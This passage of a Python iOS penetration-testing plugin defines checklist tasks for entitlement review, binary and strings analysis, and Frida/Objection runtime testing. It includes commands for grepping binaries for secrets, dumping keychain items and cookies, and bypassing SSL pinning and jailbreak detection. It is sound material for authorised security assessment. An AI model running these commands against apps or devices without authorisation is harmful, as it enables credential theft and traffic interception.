                                    'No code signing bypasses',
                                    'Appropriate security posture'
                                ],
                                'failure_indicators': [
                                    'get-task-allow = true (CRITICAL: debuggable in production)',
                                    'Private entitlements without Apple approval',
                                    'run-unsigned-code present',
                                    'Security features disabled'
                                ],
                                'alternatives': [
                                    'grep: grep -i "get-task-allow\\|private\\|unsigned" entitlements.plist',
                                    'Automated: codesign --display --entitlements - App.app',
                                    'Source: Compare with Xcode entitlements file'
                                ],
                                'notes': 'CRITICAL: get-task-allow=true means ANY process can debug app (memory dump, inject code). Should NEVER be in App Store builds!'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_static_analysis_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Static analysis tasks for iOS apps"""
        return {
            'id': f'static-analysis-{port}',
            'name': 'Static Analysis Tasks',
            'type': 'parent',
            'children': [
                {
                    'id': f'binary-analysis-{port}',
                    'name': 'Binary Analysis',
                    'type': 'command',
                    'metadata': {
                        'command': 'otool -hv /path/to/AppBinary',
                        'description': 'Analyze Mach-O header for security flags',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            'otool': 'Object file displaying tool (part of Xcode)',
                            '-h': 'Display Mach-O header',
                            '-v': 'Verbose (human-readable flags)'
                        },
                        'success_indicators': [
                            'PIE flag set (position independent executable)',
                            'Stack canaries enabled',
                            'ARC enabled (automatic reference counting)'
                        ],
                        'failure_indicators': [
                            'PIE not set (ASLR disabled)',
                            'No stack protection',
                            'Weak security posture'
                        ],
                        'next_steps': [
                            'Check for PIE: look for MH_PIE flag',
                            'Verify code signing: codesign -dv App.app',
                            'Check for encrypted binary: otool -l | grep cryptid',
                            'Analyze load commands: otool -l'
                        ],
                        'alternatives': [
                            'rabin2 -I AppBinary',
                            'jtool2 --analyze AppBinary',
                            'MachOView (GUI tool)'
                        ],
                        'notes': 'Key flags: PIE (ASLR), STACK_CANARY (buffer overflow protection). All modern iOS apps should have PIE enabled.'
                    }
                },
                {
                    'id': f'class-dump-{port}',
                    'name': 'Class Dump Analysis',
                    'type': 'command',
                    'metadata': {
                        'command': 'class-dump /path/to/AppBinary -H -o headers/',
                        'description': 'Extract Objective-C class headers for code review',
                        'tags': ['OSCP:HIGH', 'ENUM'],
                        'flag_explanations': {
                            'class-dump': 'Extract Objective-C runtime information',
                            '-H': 'Generate header files',
                            '-o': 'Output directory'
                        },
                        'success_indicators': [
                            'Header files generated',
                            'Class interfaces visible',
                            'Method signatures extracted'
                        ],
                        'failure_indicators': [
                            'Binary encrypted (decrypt first)',
                            'Swift-only app (no Objective-C)',
                            'class-dump not installed'
                        ],
                        'next_steps': [
                            'Review sensitive method names',
                            'Identify authentication classes',
                            'Find crypto implementations',
                            'Look for debug methods',
                            'Search for hardcoded strings in methods'
                        ],
                        'alternatives': [
                            'dsdump: Swift/ObjC class dump',
                            'jtool2 --classes AppBinary',
                            'Frida: ObjC.classes enumeration at runtime'
                        ],
                        'notes': 'For Swift apps, use dsdump or runtime inspection. class-dump only works for Objective-C.'
                    }
                },
                {
                    'id': f'strings-analysis-{port}',
                    'name': 'Strings Analysis',
                    'type': 'command',
                    'metadata': {
                        'command': 'strings /path/to/AppBinary | grep -iE "password|secret|token|api_key|private" > sensitive_strings.txt',
                        'description': 'Search for hardcoded credentials and secrets',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'strings': 'Extract printable strings from binary',
                            'grep -iE': 'Case-insensitive extended regex',
                            'password|secret|token': 'Common sensitive patterns'
                        },
                        'success_indicators': [
                            'Hardcoded credentials found',
                            'API keys discovered',
                            'Secrets in plaintext'
                        ],
                        'failure_indicators': [
                            'No sensitive strings (good!)',
                            'Strings obfuscated',
                            'Binary encrypted'
                        ],
                        'next_steps': [
                            'Review all matched strings',
                            'Check for API keys and test if valid',
                            'Search for URLs: strings | grep http',
                            'Look for emails: strings | grep @'
                        ],
                        'alternatives': [
                            'rabin2 -zz AppBinary | grep -i password',
                            'r2 -qc izz AppBinary',
                            'hexdump -C AppBinary | less (manual review)'
                        ],
                        'notes': 'Also search for: certificate, credential, auth, bearer, jwt, encryption_key. Check surrounding context for usage.'
                    }
                },
                {
                    'id': f'info-plist-analysis-{port}',
                    'name': 'Info.plist Security Review',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Review Info.plist for security misconfigurations',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            '1. Check ATS: NSAppTransportSecurity settings',
                            '2. Verify URL schemes: CFBundleURLSchemes',
                            '3. Review permissions: NS*UsageDescription keys',
                            '4. Check for custom entitlements',
                            '5. Verify bundle identifier and version'
                        ],
                        'success_indicators': [
                            'ATS properly configured (no NSAllowsArbitraryLoads)',
                            'URL schemes validated in code',
                            'Appropriate permission justifications'
                        ],
                        'failure_indicators': [
                            'NSAllowsArbitraryLoads = true (allows HTTP)',
                            'Missing usage description strings',
                            'Suspicious URL schemes'
                        ],
                        'alternatives': [
                            'plutil -p Info.plist',
                            'cat Info.plist (if XML)',
                            'Xcode: Open Info.plist in editor'
                        ],
                        'notes': 'Key checks: ATS exceptions (should be minimal), URL schemes (validate in code), usage descriptions (appropriate for functionality)'
                    }
                }
            ]
        }

    def _get_dynamic_analysis_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Dynamic analysis and runtime testing"""
        return {
            'id': f'dynamic-analysis-{port}',
            'name': 'Dynamic Analysis & Runtime Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'frida-setup-{port}',
                    'name': 'Frida Setup & Verification',
                    'type': 'command',
                    'metadata': {
                        'command': f'frida-ps -U',
                        'description': 'Verify Frida connection to iOS device',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            'frida-ps': 'List processes on device',
                            '-U': 'Connect to USB device'
                        },
                        'success_indicators': [
                            'Process list displayed',
                            'Frida server running on device',
                            'Connection successful'
                        ],
                        'failure_indicators': [
                            'Connection refused (Frida server not running)',
                            'Device not found (USB connection issue)',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'If failed: Install Frida server on device',
                            'Start target app: frida -U -n AppName',
                            'List available scripts: ls frida_scripts/',
                            'Begin hooking and testing'
                        ],
                        'alternatives': [
                            'Objection: objection explore (higher-level interface)',
                            'Cycript: cycript -p AppName',
                            'lldb: Debug via Xcode debugger'
                        ],
                        'notes': 'Install Frida on jailbroken device: Cydia > Add Source > https://build.frida.re > Install Frida. Start: frida-server &'
                    }
                },
                {
                    'id': f'objection-explore-{port}',
                    'name': 'Objection Interactive Exploration',
                    'type': 'command',
                    'metadata': {
                        'command': f'objection -g AppName explore',
                        'description': 'Interactive iOS app runtime exploration',
                        'tags': ['OSCP:HIGH', 'DYNAMIC'],
                        'flag_explanations': {
                            'objection': 'Runtime mobile security assessment framework',
                            '-g AppName': 'Gadget mode / attach to app',
                            'explore': 'Start interactive REPL'
                        },
                        'success_indicators': [
                            'Objection REPL started',
                            'App information displayed',
                            'Commands available'
                        ],
                        'failure_indicators': [
                            'App not found',
                            'Frida server not running',
                            'Anti-tampering detection'
                        ],
                        'next_steps': [
                            'ios info binary - App information',
                            'ios hooking list classes - List all classes',
                            'ios keychain dump - Extract keychain items',
                            'ios nsuserdefaults get - Dump preferences',
                            'ios cookies get - Extract cookies',
                            'ios ui dump - View hierarchy'
                        ],
                        'alternatives': [
                            'Frida: frida -U -n AppName',
                            'Cycript: cycript -p AppName',
                            'Custom Frida scripts for specific tasks'
                        ],
                        'notes': 'Useful commands: ios hooking watch class CLASS, ios pasteboard monitor, ios plist cat /path/to/file.plist'
                    }
                },
                {
                    'id': f'ssl-pinning-bypass-{port}',
                    'name': 'SSL Pinning Bypass',
                    'type': 'command',
                    'metadata': {
                        'command': f'objection -g AppName explore --startup-command "ios sslpinning disable"',
                        'description': 'Disable SSL certificate pinning for traffic interception',
                        'tags': ['OSCP:HIGH', 'DYNAMIC'],
                        'flag_explanations': {
                            '--startup-command': 'Execute command on REPL start',
                            'ios sslpinning disable': 'Hook SSL validation methods'
                        },
                        'success_indicators': [
                            'SSL pinning disabled',
                            'Burp Suite intercepts HTTPS traffic',
                            'Certificate warnings bypassed'
                        ],
                        'failure_indicators': [
                            'App still rejects proxy certificate',
                            'Connection errors',
                            'Advanced pinning implementation'
                        ],
                        'next_steps': [
                            'Configure iOS proxy: Settings > WiFi > Proxy',
                            'Install Burp certificate on device',
                            'Test API requests in Burp',
                            'Analyze request/response data'
                        ],
                        'alternatives': [
                            'SSL Kill Switch 2 (Cydia tweak)',
                            'Manual Frida script: Hook NSURLSession methods',
                            'Proxyman: Has built-in SSL unpinning'
                        ],
                        'notes': 'If objection fails, try: frida -U -f com.app.bundle -l ssl-pinning-bypass.js. Multiple pinning methods exist (TrustKit, AFNetworking, custom).'
                    }
                },
                {
                    'id': f'jailbreak-detection-bypass-{port}',
                    'name': 'Jailbreak Detection Bypass',
                    'type': 'command',
                    'metadata': {
                        'command': f'objection -g AppName explore --startup-command "ios jailbreak disable"',
                        'description': 'Bypass jailbreak detection mechanisms',
                        'tags': ['OSCP:MEDIUM', 'DYNAMIC'],
                        'flag_explanations': {
                            'ios jailbreak disable': 'Hook common jailbreak detection methods'
                        },
                        'success_indicators': [
                            'Jailbreak checks bypassed',
                            'App runs normally on jailbroken device',
                            'No security warnings'
                        ],
                        'failure_indicators': [
                            'App still detects jailbreak',
                            'App crashes or exits',
                            'Custom detection not covered'
                        ],
                        'next_steps': [
                            'Identify detection methods: Hook file access checks',
                            'Hook common detection APIs: stat(), fork(), syscall()',
                            'Patch binary to remove checks (permanent)',
                            'Monitor for anti-tampering'
                        ],
                        'alternatives': [
                            'Liberty Lite (Cydia tweak)',
                            'Shadow (Cydia tweak)',
                            'Custom Frida script for app-specific checks'
                        ],
                        'notes': 'Common checks: File exists (/bin/bash, /Applications/Cydia.app), URL schemes (cydia://), fork() success, sandboxing violations'
                    }
                }
            ]
        }


# Test detection (optional - not required by base class)
if __name__ == '__main__':
    plugin = iOSAppAnalysisPlugin()
    test_port_info = {
        'port': 22,
        'service': 'ssh',
        'version': 'iOS 15.0',
        'state': 'open'
    }
    print(f"Plugin: {plugin.name}")
    print(f"Detects test service: {plugin.detect(test_port_info)}")
